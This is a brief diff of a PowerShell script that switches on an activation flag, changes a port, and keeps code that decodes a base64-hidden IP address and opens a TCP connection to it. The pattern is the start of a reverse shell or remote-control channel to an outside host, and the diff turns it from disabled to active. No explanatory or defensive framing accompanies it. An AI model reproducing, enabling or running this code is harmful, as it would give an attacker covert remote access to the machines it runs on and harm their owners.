@@ -1,4 +1,4 @@
-$Active = 0; 
+$Active = 1; 
 
 
 if ($Active -ne 1) { exit }
@@ -9,7 +9,7 @@ try {
     
     
     $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
-    $port = 47045;
+    $port = 58475;
 
     $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
     $NetworkStream = $TCPClient.GetStream();
